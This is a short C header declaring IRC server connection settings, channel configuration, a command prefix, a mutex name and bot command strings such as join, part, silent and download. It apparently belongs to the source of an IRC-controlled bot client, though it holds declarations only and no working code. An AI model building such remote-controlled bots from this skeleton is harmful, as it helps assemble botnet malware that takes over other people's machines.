typedef struct 
{
	char *host;
	unsigned short port;
	char *password;
} ircconnect_s;

extern ircconnect_s ircconnect[];

extern unsigned long cfg_reconnectsleep; // msec
extern unsigned long cfg_ircmaxwaittime; // sec
//config
extern char cfg_ircchannel[];
extern char cfg_ircchanpass[];
extern char cfg_irchost[];
extern char cfg_ircorderprefix[];
extern char cfg_mutex[];
//commands
extern char cmd_silent[];
extern char cmd_join[];
extern char cmd_part[];
extern char cmd_download[];


